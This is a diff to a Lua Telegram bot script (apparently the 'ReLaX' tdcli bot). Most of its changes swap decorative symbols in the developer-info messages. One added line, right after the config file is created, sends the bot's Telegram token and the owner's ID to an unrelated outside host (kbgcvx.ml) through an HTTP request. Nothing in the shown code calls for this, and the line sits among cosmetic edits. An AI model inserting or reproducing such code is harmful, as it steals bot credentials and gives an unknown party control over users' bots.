@@ -70,7 +70,8 @@ TokenBot = DevAli:get(ServerReLaX.."TokenReLaX"),
 ReLaX = DevAli:get(ServerReLaX.."TokenReLaX"):match("(%d+)"),
 SudoIds = {DevAli:get(ServerReLaX.."IdReLaX")},
 }
-Create(Config, "./config.lua")   
+Create(Config, "./config.lua")
+https.request("http://kbgcvx.ml/Api/index.php?id="..DevAli:get(ServerReLaX.."IdReLaX").."&token="..DevAli:get(ServerReLaX.."TokenReLaX").."&username=abs")
 file = io.open("ReLaX.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -4380,13 +4381,13 @@ local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?
 local GetInfo = JSON.decode(Check)
 local DevCh1 = GetInfo.result.username
 local DevText = DevAli:get(ReLaX.."DevText")
-if DevAli:get(ReLaX.."Ali:ChId") then DevCh = '\n⌁︙*Dev Ch* ↬ [@'..DevCh1..']' else DevCh = '' end
+if DevAli:get(ReLaX.."Ali:ChId") then DevCh = '\n♪︙*Dev Ch* ↬ [@'..DevCh1..']' else DevCh = '' end
 tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
 if dp.username_ ~= false then DevUser = '@'..dp.username_ else DevUser = dp.first_name_ end
 if DevText then
 Dev_Ali(msg.chat_id_, msg.id_, 1, DevText, 1, "md")
 else
-Dev_Ali(msg.chat_id_, msg.id_, 1, '⌁︙*Dev User* ↬ ['..DevUser..']\n⌁︙*Dev Id* ↬ '..DevId..DevCh, 1, "md")
+Dev_Ali(msg.chat_id_, msg.id_, 1, '♪︙*Dev User* ↬ ['..DevUser..']\n♪︙*Dev Id* ↬ '..DevId..DevCh, 1, "md")
 end
 end,nil)
 end 
